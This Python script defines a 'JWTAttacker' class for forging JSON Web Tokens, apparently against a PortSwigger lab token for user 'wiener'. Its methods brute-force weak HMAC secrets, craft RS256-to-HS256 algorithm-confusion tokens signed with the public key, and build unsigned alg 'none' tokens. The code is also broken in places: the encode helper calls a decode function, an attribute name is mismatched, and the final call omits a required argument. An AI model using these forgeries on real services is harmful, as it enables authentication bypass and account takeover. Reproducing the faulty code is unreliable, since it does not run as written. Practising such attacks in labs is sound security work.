import base64
import json
import hmac
import hashlib

def b64url_encode(data):
    return base64.urlsafe_b64decode(data).rstrip(b'=')


def b64url_decode(data):
    padding = '=' * (4- (len(data) % 4))
    
    return base64.urlsafe_b64decode(data + padding)


class JWTAttacker:
    def __init__(self,original_jwt):
        self.parts = original_jwt.split('.')
        self.header = json.loads(b64url_decode(self.parts[0]))
        self.payload = json.loads(b64url_decode(self.parts[1]))
        self.sign_b64 = self.parts[2]
        
    def build_token(self, header_dict, payload_dict, signature_bytes=b""):
        h_b64 = b64url_encode(json.dumps(header_dict).encode()).decode()
        p_b64 = b64url_encode(json.dumps(payload_dict).encode()).decode()
        s_b64 = b64url_encode(signature_bytes).decode() if signature_bytes else ""
        return f"{h_b64}.{p_b64}.{s_b64}"
        
        
    def crack_weak_secret(self, dictionary_list):
        message = f"{self.parts[0]}.{self.parts[1]}".encode()
        for secret in dictionary_list:
            sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            if b64url_encode(sig).decode() == self.signature_b64:
                return secret
        return None
    
    def craft_algo_confusion(self, public_key_pem: str, modified_payload: dict):
        header = self.header.copy()
        header['alg'] = 'HS256'
        
        message = f"{b64url_encode(json.dumps(header).encode()).decode()}.{b64url_encode(json.dumps(modified_payload).encode()).decode()}"
        # 用公钥字符串作为 HMAC 的密钥
        sig = hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
        
        return f"{message}.{b64url_encode(sig).decode()}"
    
    
    def craft_none_alg(self, modified_payload: dict):
        header = self.header.copy()
        header['alg'] = 'none'
        return self.build_token(header, modified_payload)
    
    
jwt="eyJraWQiOiI2NzQ4ZjQ4Yy1kYzgyLTRmNjEtYjE5MS0xMjY4OGFhZTlmOTciLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3NDg0ODUyNSwic3ViIjoid2llbmVyIn0.GEcFIJMwt0xhIsUjCWqxh9ASdNIfXiEai0-fXCp7JxrRaiHvP3xmtySzxs0coFsm8L1rKO4a6QoBA--6UpmLUI0ApWGSeEM6iJDGSFAUYGkGYC-wIe54b14qgWbXNMRPEas22UgLYRd8WinStpY34CO1Vnq9dHxDl7EWjMOSyLdF3RlOadeUaO_Wcn-9fD3kAQK4vlpNVsINASXAgmAKKBeWUap7rfrtIEt5cVNIOyU5jqQKZxQhva5ArNMt9Mv6h-bQP1IceEg7JgrTenH0cHbEujzTVNsC3nkIHq1zwR_0jjBCuDymgnCa6Thj1q_IioDM61q0RobOsnOooWEE-A"
    
j = JWTAttacker(jwt)

print(j.craft_none_alg())

